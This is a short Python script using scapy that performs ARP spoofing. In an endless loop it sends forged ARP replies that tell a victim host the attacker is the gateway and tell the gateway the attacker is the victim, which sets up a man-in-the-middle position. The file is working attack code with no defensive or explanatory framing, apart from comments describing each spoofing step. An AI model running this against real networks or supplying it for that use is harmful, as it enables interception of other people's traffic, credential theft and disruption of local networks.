from scapy.all import * 
import time

def gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
    try:
        while True:
            #telling the victim that we are the gateway
            arpVictim = Ether()/ARP()
            arpVictim[Ether].src = macAttacker
            arpVictim[ARP].hwsrc = macAttacker
            arpVictim[ARP].psrc = ipGateway
            arpVictim[ARP].hwdst = macVictim
            arpVictim[ARP].pdst = ipVictim

            #telling the gateway that we are the victim
            arpGateway = Ether()/ARP()
            arpGateway[Ether].src = macAttacker
            arpGateway[ARP].hwsrc = macAttacker
            arpGateway[ARP].psrc = ipVictim
            arpGateway[ARP].hwdst = macGateway
            arpGateway[ARP].pdst = ipGateway

            sendp(arpVictim, iface=interface)
            sendp(arpGateway, iface=interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Stopping ARP spoofing...")
        return

def spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface, ):
    gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface)
